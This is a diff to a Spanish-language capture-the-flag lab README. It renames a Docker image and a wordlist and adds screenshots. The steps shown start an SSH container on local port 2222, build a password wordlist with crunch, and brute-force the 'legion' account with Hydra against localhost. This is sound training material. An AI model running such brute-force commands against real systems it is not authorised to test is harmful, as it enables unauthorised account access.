@@ -73,8 +73,10 @@ sudo apt update && sudo apt install docker.io
 Ejecutar el contenedor exponiendo el puerto SSH:
 
 ```bash
-docker run -d -p 2222:22 --name ctf-legion ubuntu-ssh-retocftf:latest
+docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0
 ```
+<img width="560" height="70" alt="image" src="https://github.com/user-attachments/assets/f34f0626-a730-43eb-958a-6b1518aad163" />
+
 Verificar estado del contenedor y la red Docker:
 
 ```bash
@@ -100,8 +102,9 @@ De este modo, se construye una contraseña probable que se verificará experimen
 Para abarcar variantes de la contraseña, se crea un diccionario adaptado con reglas impuestas por el acertijo:
 
 ```bash
-crunch 5 5 -t E@@G* -o posibles.txt
+crunch 5 5 -t E@@G* -o lista.txt
 ```
+<img width="500" height="156" alt="image" src="https://github.com/user-attachments/assets/cfd3c103-b3ed-4764-9aae-4e9c75b20417" />
 
 -t E@@G* define una máscara que varía posiciones intermedias y añade flexibilidad a la búsqueda.
 
@@ -117,8 +120,9 @@ Se recomienda personalizar la máscara para enfocarse en posibles letras identif
 Una vez listo el diccionario, se ejecuta Hydra para automatizar el ataque contra SSH, empleando el usuario objetivo y el archivo de contraseñas:
 
 ```bash
-hydra -l legion -P posibles.txt ssh://localhost -s 2222
+hydra -l legion -P lista.txt ssh://localhost -s 2222
 ```
+<img width="589" height="269" alt="image" src="https://github.com/user-attachments/assets/93bcd1f3-2085-474c-9005-78bf40a0589b" />
 
 Donde:
 
